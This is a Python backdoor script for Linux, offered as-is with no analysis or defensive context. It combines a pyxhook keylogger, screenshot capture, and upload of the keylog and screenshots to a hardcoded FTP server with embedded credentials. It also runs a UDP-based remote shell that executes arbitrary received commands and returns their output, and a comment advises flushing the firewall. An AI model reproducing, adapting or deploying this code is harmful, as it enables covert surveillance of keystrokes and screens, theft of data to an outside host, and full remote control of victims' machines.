#! /usr/bin/python
# remember to iptables -F 

import socket
import os
import sys
import platform
import subprocess
import pyxhook # pip install pyxhook 
import getpass
import ftplib 

# key logger ---------------------------------------------------
username = getpass.getuser()
log_file = "/" + username + "/Documents/key.log"

def OnKeyPress(event):
	fob=open(log_file, 'a')
	fob.write(event.Key)
	fob.write('\n')
	
	if event.Ascii==96:
		fob.close()
		new_hook.cancel()

new_hook=pyxhook.HookManager()
new_hook.KeyDown=OnKeyPress
new_hook.HookKeyboard()
new_hook.start() 
# --------------------------------------------------------------

def keylogsend(log_file):
	session = ftplib.FTP('184.65.181.153', 'vanftp', 'canucks') #make sure ftp server is running
	file = open(log_file, 'rb')
	session.storbinary('STOR keylog.log', file)
	file.close()
	session.close()
	
def screenshot():
	screenshot_file = "/" + username + "/Documents/screenshot.jpg"
	os.system("gnome-screenshot --file=" + screenshot_file)
	session = ftplib.FTP('184.65.181.153', 'vanftp', 'canucks') #make sure ftp server is running
	file = open(screenshot_file, 'rb')
	session.storbinary('STOR screenshot.jpg', file)
	file.close()
	session.close() 

def launch():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.bind(('', 77))
	launch = s.recvfrom(1024)
	addr = launch[1][0]
	port = launch[1][1]
	s.sendto('hello paul', (addr, port))
	return s, addr, port

s, addr, port = launch()

def getsysinfo():
	que = s.recvfrom(1024)
	prompt = []
	if que[1][0] == addr and que[1][1] == port:
		if os.getuid() == 0:
			prompt.append('root@')
			prompt.append('# ')
		else:
			prompt.append('user@')	
			prompt.append('$ ')
		prompt.insert(1, platform.dist()[0])
	s.sendto(''.join(prompt), (addr, port))
	return

getsysinfo()

def shell(log_file):
	while 1:
		try:
			command = s.recv(1024)
			# handles change directory
			if command.strip().split()[0] == 'cd': # CD command 
				os.chdir(command.strip('cd '))
				s.sendto('Changed Directory', (addr, port)) 
			# Sends keylog file to ftp server
			elif command.strip() == 'keylog': 
				try:
					#conn.voidcom("NOOP") #check if FTP is up
					keylogsend(log_file)
					s.sendto('Keylog file sent to FTP server', (addr, port)) 
				except Exception:
					s.sendto('FTP server not up', (addr, port)) 
			# Sends screenshot to ftp server
			elif command.strip() == 'screenshot': 
				try:
					#conn.voidcom("NOOP") #check if FTP is up
					screenshot()
					s.sendto('screenshot taken and sent to FTP server', (addr, port))
				except Exception:
					s.sendto('FTP server not up', (addr, port)) 
			# Closes the backdoor
			elif command.strip() == 'exit': 
				s.sendto('Goodbye', (addr, port))
				new_hook.cancel()
				s.close()
				break
			# handles regular shell commands 
			else:
				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				stdout, stderr = proc.communicate()
				output = stdout + stderr 
				s.sendto(output, (addr, port))
		except Exception:
			s.sendto('An unexpected error has occured', (addr, port))
			pass

shell(log_file)
